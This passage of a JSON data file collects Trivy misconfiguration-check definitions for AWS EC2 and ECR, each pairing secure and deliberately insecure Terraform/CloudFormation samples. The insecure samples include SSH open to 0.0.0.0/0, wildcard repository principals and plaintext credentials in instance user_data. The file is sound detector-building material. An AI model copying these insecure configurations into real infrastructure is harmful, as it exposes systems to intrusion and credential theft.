              "resource \"aws_security_group\" \"good_example\" {\n  egress {\n    cidr_blocks = [\"1.2.3.4/32\"]\n  }\n}"
            ],
            "bad": [
              "resource \"aws_security_group\" \"bad_example\" {\n  egress {\n    cidr_blocks = [\"0.0.0.0/0\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_INGRESS_ACL",
        "title": "No Public Ingress Acl",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-networkaclentry.html\n  good:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        NetworkACL:\n          Type: AWS::EC2::NetworkAcl\n          Properties:\n            VpcId: something\n\n        Rule:\n          Type: AWS::EC2::NetworkAclEntry\n          Properties:\n            CidrBlock: 10.0.0.0/8\n            NetworkAclId: !Ref NetworkACL\n            Protocol: 6\n            RuleAction: allow\n            PortRange:\n              From: 22\n              To: 22\n  bad:\n    - |-\n      AWSTemplateFormatVersion: \"2010-09-09\"\n\n      Resources:\n        NetworkACL:\n          Type: AWS::EC2::NetworkAcl\n          Properties:\n            VpcId: something\n\n        Rule:\n          Type: AWS::EC2::NetworkAclEntry\n          Properties:\n            CidrBlock: 0.0.0.0/0\n            NetworkAclId: !Ref NetworkACL\n            Protocol: 6\n            RuleAction: allow\n            PortRange:\n              From: 22\n              To: 22\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block\n  good:\n    - |-\n      resource \"aws_network_acl_rule\" \"good_example\" {\n        egress      = false\n        protocol    = \"tcp\"\n        from_port   = 22\n        to_port     = 22\n        rule_action = \"allow\"\n        cidr_block  = \"10.0.0.0/16\"\n      }\n  bad:\n    - |-\n      resource \"aws_network_acl_rule\" \"bad_example\" {\n        egress      = false\n        protocol    = \"tcp\"\n        from_port   = 22\n        to_port     = 22\n        rule_action = \"allow\"\n        cidr_block  = \"0.0.0.0/0\"\n      }\n",
        "file_name": "no_public_ingress_acl.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_ingress_acl.yaml",
        "local_path": "aws/ec2/no_public_ingress_acl.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-networkaclentry.html"
            ],
            "good": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  NetworkACL:\n    Type: AWS::EC2::NetworkAcl\n    Properties:\n      VpcId: something\n\n  Rule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n      CidrBlock: 10.0.0.0/8\n      NetworkAclId: !Ref NetworkACL\n      Protocol: 6\n      RuleAction: allow\n      PortRange:\n        From: 22\n        To: 22"
            ],
            "bad": [
              "AWSTemplateFormatVersion: \"2010-09-09\"\n\nResources:\n  NetworkACL:\n    Type: AWS::EC2::NetworkAcl\n    Properties:\n      VpcId: something\n\n  Rule:\n    Type: AWS::EC2::NetworkAclEntry\n    Properties:\n      CidrBlock: 0.0.0.0/0\n      NetworkAclId: !Ref NetworkACL\n      Protocol: 6\n      RuleAction: allow\n      PortRange:\n        From: 22\n        To: 22"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block"
            ],
            "good": [
              "resource \"aws_network_acl_rule\" \"good_example\" {\n  egress      = false\n  protocol    = \"tcp\"\n  from_port   = 22\n  to_port     = 22\n  rule_action = \"allow\"\n  cidr_block  = \"10.0.0.0/16\"\n}"
            ],
            "bad": [
              "resource \"aws_network_acl_rule\" \"bad_example\" {\n  egress      = false\n  protocol    = \"tcp\"\n  from_port   = 22\n  to_port     = 22\n  rule_action = \"allow\"\n  cidr_block  = \"0.0.0.0/0\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_INGRESS_SGR",
        "title": "No Public Ingress Sgr",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-securitygroup.html\n  good:\n    - |-\n      Resources:\n        GoodSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupIngress:\n              - CidrIp: 127.0.0.1/32\n                IpProtocol: \"6\"\n                FromPort: 22\n                ToPort: 22\n  bad:\n    - |-\n      Resources:\n        BadSecurityGroup:\n          Type: AWS::EC2::SecurityGroup\n          Properties:\n            GroupDescription: Limits security group egress traffic\n            SecurityGroupIngress:\n              - CidrIp: 0.0.0.0/0\n                IpProtocol: \"6\"\n                FromPort: 22\n                ToPort: 22\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks\n  good:\n    - |-\n      resource \"aws_security_group_rule\" \"good_example\" {\n        type        = \"ingress\"\n        cidr_blocks = [\"10.0.0.0/16\"]\n      }\n    - |-\n      resource \"aws_security_group_rule\" \"example\" {\n        type              = \"ingress\"\n        security_group_id = \"sg-123456\"\n        from_port         = 22\n        to_port           = 22\n        protocol          = \"tcp\"\n        cidr_blocks = [\n          \"1.2.3.4/32\",\n          \"4.5.6.7/32\",\n        ]\n      }\n  bad:\n    - |-\n      resource \"aws_security_group_rule\" \"bad_example\" {\n        type        = \"ingress\"\n        from_port   = 22\n        to_port     = 22\n        protocol    = \"tcp\"\n        cidr_blocks = [\"0.0.0.0/0\"]\n      }\n",
        "file_name": "no_public_ingress_sgr.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_ingress_sgr.yaml",
        "local_path": "aws/ec2/no_public_ingress_sgr.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-securitygroup.html"
            ],
            "good": [
              "Resources:\n  GoodSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupIngress:\n        - CidrIp: 127.0.0.1/32\n          IpProtocol: \"6\"\n          FromPort: 22\n          ToPort: 22"
            ],
            "bad": [
              "Resources:\n  BadSecurityGroup:\n    Type: AWS::EC2::SecurityGroup\n    Properties:\n      GroupDescription: Limits security group egress traffic\n      SecurityGroupIngress:\n        - CidrIp: 0.0.0.0/0\n          IpProtocol: \"6\"\n          FromPort: 22\n          ToPort: 22"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks"
            ],
            "good": [
              "resource \"aws_security_group_rule\" \"good_example\" {\n  type        = \"ingress\"\n  cidr_blocks = [\"10.0.0.0/16\"]\n}",
              "resource \"aws_security_group_rule\" \"example\" {\n  type              = \"ingress\"\n  security_group_id = \"sg-123456\"\n  from_port         = 22\n  to_port           = 22\n  protocol          = \"tcp\"\n  cidr_blocks = [\n    \"1.2.3.4/32\",\n    \"4.5.6.7/32\",\n  ]\n}"
            ],
            "bad": [
              "resource \"aws_security_group_rule\" \"bad_example\" {\n  type        = \"ingress\"\n  from_port   = 22\n  to_port     = 22\n  protocol    = \"tcp\"\n  cidr_blocks = [\"0.0.0.0/0\"]\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_IP",
        "title": "No Public Ip",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-autoscaling-launchconfiguration.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            ImageId: ami-123456\n            InstanceType: t2.small\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::AutoScaling::LaunchConfiguration\n          Properties:\n            AssociatePublicIpAddress: true\n            ImageId: ami-123456\n            InstanceType: t2.small\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address\n  good:\n    - |-\n      resource \"aws_launch_configuration\" \"good_example\" {\n        associate_public_ip_address = false\n      }\n  bad:\n    - |-\n      resource \"aws_launch_configuration\" \"bad_example\" {\n        associate_public_ip_address = true\n      }\n",
        "file_name": "no_public_ip.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_ip.yaml",
        "local_path": "aws/ec2/no_public_ip.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-autoscaling-launchconfiguration.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      ImageId: ami-123456\n      InstanceType: t2.small"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::AutoScaling::LaunchConfiguration\n    Properties:\n      AssociatePublicIpAddress: true\n      ImageId: ami-123456\n      InstanceType: t2.small"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#associate_public_ip_address",
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#associate_public_ip_address"
            ],
            "good": [
              "resource \"aws_launch_configuration\" \"good_example\" {\n  associate_public_ip_address = false\n}"
            ],
            "bad": [
              "resource \"aws_launch_configuration\" \"bad_example\" {\n  associate_public_ip_address = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_PUBLIC_IP_SUBNET",
        "title": "No Public Ip Subnet",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  links:\n    - https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-subnet.html\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::Subnet\n          Properties:\n            VpcId: vpc-123456\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::Subnet\n          Properties:\n            MapPublicIpOnLaunch: true\n            VpcId: vpc-123456\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet#map_public_ip_on_launch\n  good:\n    - |-\n      resource \"aws_subnet\" \"good_example\" {\n        vpc_id                  = \"vpc-123456\"\n        map_public_ip_on_launch = false\n      }\n  bad:\n    - |-\n      resource \"aws_subnet\" \"bad_example\" {\n        vpc_id                  = \"vpc-123456\"\n        map_public_ip_on_launch = true\n      }\n",
        "file_name": "no_public_ip_subnet.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_public_ip_subnet.yaml",
        "local_path": "aws/ec2/no_public_ip_subnet.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "links": [
              "https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-ec2-subnet.html"
            ],
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::Subnet\n    Properties:\n      VpcId: vpc-123456"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::Subnet\n    Properties:\n      MapPublicIpOnLaunch: true\n      VpcId: vpc-123456"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/subnet#map_public_ip_on_launch"
            ],
            "good": [
              "resource \"aws_subnet\" \"good_example\" {\n  vpc_id                  = \"vpc-123456\"\n  map_public_ip_on_launch = false\n}"
            ],
            "bad": [
              "resource \"aws_subnet\" \"bad_example\" {\n  vpc_id                  = \"vpc-123456\"\n  map_public_ip_on_launch = true\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_SECRETS_IN_USER_DATA",
        "title": "No Secrets In User Data",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::EC2::Instance\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: /dev/sdm\n                Ebs:\n                  DeleteOnTermination: \"false\"\n                  Iops: \"200\"\n                  VolumeSize: \"20\"\n                  VolumeType: io1\n              - DeviceName: /dev/sdk\n            ImageId: ami-79fd7eee\n            KeyName: testkey\n            UserData: export SSM_PATH=/database/creds\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::EC2::Instance\n          Properties:\n            BlockDeviceMappings:\n              - DeviceName: /dev/sdm\n                Ebs:\n                  DeleteOnTermination: \"false\"\n                  Iops: \"200\"\n                  VolumeSize: \"20\"\n                  VolumeType: io1\n              - DeviceName: /dev/sdk\n            ImageId: ami-79fd7eee\n            KeyName: testkey\n            UserData: export DATABASE_PASSWORD=password1234\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data\n  good:\n    - |-\n      resource \"aws_instance\" \"good_example\" {\n        ami           = \"ami-12345667\"\n        instance_type = \"t2.small\"\n\n        user_data = <<EOF\n      \t export GREETING=hello\n       EOF\n      }\n  bad:\n    - |-\n      resource \"aws_instance\" \"bad_example\" {\n        ami           = \"ami-12345667\"\n        instance_type = \"t2.small\"\n        user_data     = <<EOF\n          export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n          export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n          export AWS_DEFAULT_REGION=us-west-2\n        EOF\n      }\n",
        "file_name": "no_secrets_in_user_data.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_secrets_in_user_data.yaml",
        "local_path": "aws/ec2/no_secrets_in_user_data.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::EC2::Instance\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: /dev/sdm\n          Ebs:\n            DeleteOnTermination: \"false\"\n            Iops: \"200\"\n            VolumeSize: \"20\"\n            VolumeType: io1\n        - DeviceName: /dev/sdk\n      ImageId: ami-79fd7eee\n      KeyName: testkey\n      UserData: export SSM_PATH=/database/creds"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::EC2::Instance\n    Properties:\n      BlockDeviceMappings:\n        - DeviceName: /dev/sdm\n          Ebs:\n            DeleteOnTermination: \"false\"\n            Iops: \"200\"\n            VolumeSize: \"20\"\n            VolumeType: io1\n        - DeviceName: /dev/sdk\n      ImageId: ami-79fd7eee\n      KeyName: testkey\n      UserData: export DATABASE_PASSWORD=password1234"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/instance#user_data"
            ],
            "good": [
              "resource \"aws_instance\" \"good_example\" {\n  ami           = \"ami-12345667\"\n  instance_type = \"t2.small\"\n\n  user_data = <<EOF\n\t export GREETING=hello\n EOF\n}"
            ],
            "bad": [
              "resource \"aws_instance\" \"bad_example\" {\n  ami           = \"ami-12345667\"\n  instance_type = \"t2.small\"\n  user_data     = <<EOF\n    export AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\n    export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n    export AWS_DEFAULT_REGION=us-west-2\n  EOF\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-NO_SENSITIVE_INFO",
        "title": "No Sensitive Info",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "terraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64\n  good:\n    - |-\n      resource \"aws_launch_configuration\" \"as_conf\" {\n        name          = \"web_config\"\n        image_id      = data.aws_ami.ubuntu.id\n        instance_type = \"t2.micro\"\n        user_data     = <<EOF\n       export GREETING=\"Hello there\"\n       EOF\n      }\n    - |-\n      resource \"aws_launch_configuration\" \"as_conf\" {\n        name             = \"web_config\"\n        image_id         = data.aws_ami.ubuntu.id\n        instance_type    = \"t2.micro\"\n        user_data_base64 = \"ZXhwb3J0IEVESVRPUj12aW1hY3M=\"\n      }\n  bad:\n    - |-\n      resource \"aws_launch_configuration\" \"as_conf\" {\n        name          = \"web_config\"\n        image_id      = data.aws_ami.ubuntu.id\n        instance_type = \"t2.micro\"\n        user_data     = <<EOF\n       export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n       EOF\n      }\n    - |-\n      resource \"aws_launch_configuration\" \"as_conf\" {\n        name             = \"web_config\"\n        image_id         = data.aws_ami.ubuntu.id\n        instance_type    = \"t2.micro\"\n        user_data_base64 = \"ZXhwb3J0IERBVEFCQVNFX1BBU1NXT1JEPSJTb21lU29ydE9mUGFzc3dvcmQi\"\n      }\n",
        "file_name": "no_sensitive_info.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/no_sensitive_info.yaml",
        "local_path": "aws/ec2/no_sensitive_info.yaml",
        "parsed_metadata": {
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/launch_configuration#user_data,user_data_base64"
            ],
            "good": [
              "resource \"aws_launch_configuration\" \"as_conf\" {\n  name          = \"web_config\"\n  image_id      = data.aws_ami.ubuntu.id\n  instance_type = \"t2.micro\"\n  user_data     = <<EOF\n export GREETING=\"Hello there\"\n EOF\n}",
              "resource \"aws_launch_configuration\" \"as_conf\" {\n  name             = \"web_config\"\n  image_id         = data.aws_ami.ubuntu.id\n  instance_type    = \"t2.micro\"\n  user_data_base64 = \"ZXhwb3J0IEVESVRPUj12aW1hY3M=\"\n}"
            ],
            "bad": [
              "resource \"aws_launch_configuration\" \"as_conf\" {\n  name          = \"web_config\"\n  image_id      = data.aws_ami.ubuntu.id\n  instance_type = \"t2.micro\"\n  user_data     = <<EOF\n export DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n EOF\n}",
              "resource \"aws_launch_configuration\" \"as_conf\" {\n  name             = \"web_config\"\n  image_id         = data.aws_ami.ubuntu.id\n  instance_type    = \"t2.micro\"\n  user_data_base64 = \"ZXhwb3J0IERBVEFCQVNFX1BBU1NXT1JEPSJTb21lU29ydE9mUGFzc3dvcmQi\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-REQUIRE_VPC_FLOW_LOGS_FOR_ALL_VPCS",
        "title": "Require Vpc Flow Logs For All Vpcs",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "terraform:\n  good:\n    - |-\n      resource \"aws_vpc\" \"example\" {\n        cidr_block = \"10.0.0.0/16\"\n      }\n\n      resource \"aws_flow_log\" \"example\" {\n        log_group_name = \"example\"\n        traffic_type   = \"ALL\"\n        vpc_id         = aws_vpc.example.id\n      }\n  bad:\n    - |-\n      resource \"aws_vpc\" \"example\" {\n        cidr_block = \"10.0.0.0/16\"\n      }\n",
        "file_name": "require_vpc_flow_logs_for_all_vpcs.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/require_vpc_flow_logs_for_all_vpcs.yaml",
        "local_path": "aws/ec2/require_vpc_flow_logs_for_all_vpcs.yaml",
        "parsed_metadata": {
          "terraform": {
            "good": [
              "resource \"aws_vpc\" \"example\" {\n  cidr_block = \"10.0.0.0/16\"\n}\n\nresource \"aws_flow_log\" \"example\" {\n  log_group_name = \"example\"\n  traffic_type   = \"ALL\"\n  vpc_id         = aws_vpc.example.id\n}"
            ],
            "bad": [
              "resource \"aws_vpc\" \"example\" {\n  cidr_block = \"10.0.0.0/16\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-EC2-SPECIFY_AMI_OWNERS",
        "title": "Specify Ami Owners",
        "provider": "aws",
        "service": "ec2",
        "language": "terraform",
        "yaml_content": "terraform:\n  good:\n    - |-\n      data \"aws_ami\" \"example\" {\n        most_recent = true\n        owners      = [\"099720109477\"] # Canonical\n        filter {\n          name   = \"name\"\n          values = [\"ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*\"]\n        }\n      }\n  bad:\n    - |-\n      data \"aws_ami\" \"example\" {\n        most_recent = true\n        filter {\n          name   = \"name\"\n          values = [\"ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*\"]\n        }\n      }\n",
        "file_name": "specify_ami_owners.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ec2/specify_ami_owners.yaml",
        "local_path": "aws/ec2/specify_ami_owners.yaml",
        "parsed_metadata": {
          "terraform": {
            "good": [
              "data \"aws_ami\" \"example\" {\n  most_recent = true\n  owners      = [\"099720109477\"] # Canonical\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*\"]\n  }\n}"
            ],
            "bad": [
              "data \"aws_ami\" \"example\" {\n  most_recent = true\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd/ubuntu-focal-20.04-amd64-server-*\"]\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECR-ENABLE_IMAGE_SCANS",
        "title": "Enable Image Scans",
        "provider": "aws",
        "service": "ecr",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            ImageScanningConfiguration:\n              ScanOnPush: true\n            RepositoryName: test-repository\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            ImageScanningConfiguration:\n              ScanOnPush: false\n            RepositoryName: test-repository\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_scanning_configuration\n  good:\n    - |-\n      resource \"aws_ecr_repository\" \"good_example\" {\n        name = \"bar\"\n        image_scanning_configuration {\n          scan_on_push = true\n        }\n      }\n  bad:\n    - |-\n      resource \"aws_ecr_repository\" \"bad_example\" {\n        name = \"bar\"\n        image_scanning_configuration {\n          scan_on_push = false\n        }\n      }\n",
        "file_name": "enable_image_scans.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecr/enable_image_scans.yaml",
        "local_path": "aws/ecr/enable_image_scans.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      ImageScanningConfiguration:\n        ScanOnPush: true\n      RepositoryName: test-repository"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      ImageScanningConfiguration:\n        ScanOnPush: false\n      RepositoryName: test-repository"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository#image_scanning_configuration"
            ],
            "good": [
              "resource \"aws_ecr_repository\" \"good_example\" {\n  name = \"bar\"\n  image_scanning_configuration {\n    scan_on_push = true\n  }\n}"
            ],
            "bad": [
              "resource \"aws_ecr_repository\" \"bad_example\" {\n  name = \"bar\"\n  image_scanning_configuration {\n    scan_on_push = false\n  }\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECR-ENFORCE_IMMUTABLE_REPOSITORY",
        "title": "Enforce Immutable Repository",
        "provider": "aws",
        "service": "ecr",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            ImageTagMutability: IMMUTABLE\n            RepositoryName: test-repository\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            RepositoryName: test-repository\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository\n  good:\n    - |-\n      resource \"aws_ecr_repository\" \"good_example\" {\n        name                 = \"bar\"\n        image_tag_mutability = \"IMMUTABLE\"\n      }\n  bad:\n    - |-\n      resource \"aws_ecr_repository\" \"bad_example\" {\n        name                 = \"bar\"\n        image_tag_mutability = \"MUTABLE\"\n      }\n",
        "file_name": "enforce_immutable_repository.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecr/enforce_immutable_repository.yaml",
        "local_path": "aws/ecr/enforce_immutable_repository.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      ImageTagMutability: IMMUTABLE\n      RepositoryName: test-repository"
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      RepositoryName: test-repository"
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository"
            ],
            "good": [
              "resource \"aws_ecr_repository\" \"good_example\" {\n  name                 = \"bar\"\n  image_tag_mutability = \"IMMUTABLE\"\n}"
            ],
            "bad": [
              "resource \"aws_ecr_repository\" \"bad_example\" {\n  name                 = \"bar\"\n  image_tag_mutability = \"MUTABLE\"\n}"
            ]
          }
        }
      },
      {
        "rule_id": "AWS-ECR-NO_PUBLIC_ACCESS",
        "title": "No Public Access",
        "provider": "aws",
        "service": "ecr",
        "language": "terraform",
        "yaml_content": "cloudformation:\n  good:\n    - |-\n      Resources:\n        GoodExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            RepositoryName: test-repository\n            RepositoryPolicyText:\n              Statement:\n                - Action:\n                    - ecr:PutImage\n                  Effect: Allow\n                  Principal:\n                    AWS:\n                      - arn:aws:iam::123456789012:user/Alice\n                  Sid: AllowPushPull\n              Version: \"2012-10-17\"\n  bad:\n    - |-\n      Resources:\n        BadExample:\n          Type: AWS::ECR::Repository\n          Properties:\n            RepositoryName: test-repository\n            RepositoryPolicyText:\n              Statement:\n                - Action:\n                    - ecr:PutImage\n                  Effect: Allow\n                  Principal:\n                    AWS:\n                      - '*'\n                  Sid: AllowPushPull\n              Version: \"2012-10-17\"\nterraform:\n  links:\n    - https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository_policy#policy\n  good:\n    - |-\n      resource \"aws_ecr_repository\" \"example\" {\n        name = \"bar\"\n      }\n\n      resource \"aws_ecr_repository_policy\" \"example\" {\n        repository = aws_ecr_repository.example.name\n        policy     = <<EOF\n       {\n           \"Version\": \"2008-10-17\",\n           \"Statement\": [\n               {\n                   \"Sid\": \"new policy\",\n                   \"Effect\": \"Allow\",\n                   \"Principal\": \"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\",\n                   \"Action\": [\n                       \"ecr:SetRepositoryPolicy\"\n                   ]\n               }\n           ]\n       }\n       EOF\n      }\n  bad:\n    - |-\n      resource \"aws_ecr_repository\" \"example\" {\n        name = \"bar\"\n      }\n\n      resource \"aws_ecr_repository_policy\" \"example\" {\n        repository = aws_ecr_repository.example.name\n\n        policy = <<EOF\n       {\n           \"Version\": \"2008-10-17\",\n           \"Statement\": [\n               {\n                   \"Sid\": \"new policy\",\n                   \"Effect\": \"Allow\",\n                   \"Principal\": \"*\",\n                   \"Action\": [\n                       \"ecr:SetRepositoryPolicy\"\n                   ]\n               }\n           ]\n       }\n       EOF\n      }\n    - |-\n      resource \"aws_ecr_repository\" \"example\" {\n        name = \"bar\"\n      }\n\n      data \"aws_iam_policy_document\" \"example\" {\n        version = \"2008-10-17\"\n        statement {\n          sid    = \"new policy\"\n          effect = \"Allow\"\n          principals {\n            type        = \"*\"\n            identifiers = [\"*\"]\n          }\n          actions = [\n            \"ecr:SetRepositoryPolicy\"\n          ]\n        }\n      }\n\n      resource \"aws_ecr_repository_policy\" \"example\" {\n        repository = aws_ecr_repository.example.name\n        policy     = data.aws_iam_policy_document.example.json\n      }\n",
        "file_name": "no_public_access.yaml",
        "source_url": "https://raw.githubusercontent.com/aquasecurity/trivy-checks/main/checks/cloud/aws/ecr/no_public_access.yaml",
        "local_path": "aws/ecr/no_public_access.yaml",
        "parsed_metadata": {
          "cloudformation": {
            "good": [
              "Resources:\n  GoodExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      RepositoryName: test-repository\n      RepositoryPolicyText:\n        Statement:\n          - Action:\n              - ecr:PutImage\n            Effect: Allow\n            Principal:\n              AWS:\n                - arn:aws:iam::123456789012:user/Alice\n            Sid: AllowPushPull\n        Version: \"2012-10-17\""
            ],
            "bad": [
              "Resources:\n  BadExample:\n    Type: AWS::ECR::Repository\n    Properties:\n      RepositoryName: test-repository\n      RepositoryPolicyText:\n        Statement:\n          - Action:\n              - ecr:PutImage\n            Effect: Allow\n            Principal:\n              AWS:\n                - '*'\n            Sid: AllowPushPull\n        Version: \"2012-10-17\""
            ]
          },
          "terraform": {
            "links": [
              "https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/ecr_repository_policy#policy"
            ],
            "good": [
